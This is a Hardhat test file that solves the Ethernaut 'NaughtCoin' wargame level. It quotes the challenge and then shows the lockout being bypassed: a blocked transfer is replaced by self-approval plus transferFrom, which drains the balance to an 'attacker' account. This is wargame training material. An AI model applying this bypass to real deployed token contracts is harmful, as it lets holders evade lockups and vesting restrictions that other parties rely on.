import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { NaughtCoin } from "typechain-types";

// Challenge description

// NaughtCoin is an ERC20 token and you're already holding all of them.
// The catch is that you'll only be able to transfer them after a 10 year lockout period.
// Can you figure out how to get them out to another address so that you can transfer them freely?
// Complete this level by getting your token balance to 0.

// Things that might help
// The ERC20 Spec
// The OpenZeppelin codebase

describe("Ethernaut - NaughtCoin", async () => {
  let naughtCoin: NaughtCoin;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    naughtCoin = await ethers
      .getContractFactory("NaughtCoin", owner)
      .then((f) => f.deploy(owner.address));
  });

  it("Hacks", async () => {
    const balance = await naughtCoin.balanceOf(owner.address);

    await expect(naughtCoin.connect(owner).transfer(attacker.address, balance))
      .to.be.reverted;

    await naughtCoin.connect(owner).approve(owner.address, balance);

    await naughtCoin
      .connect(owner)
      .transferFrom(owner.address, attacker.address, balance);

    expect(await naughtCoin.balanceOf(owner.address)).equal(0);
    expect(await naughtCoin.balanceOf(attacker.address)).equal(balance);
  });
});
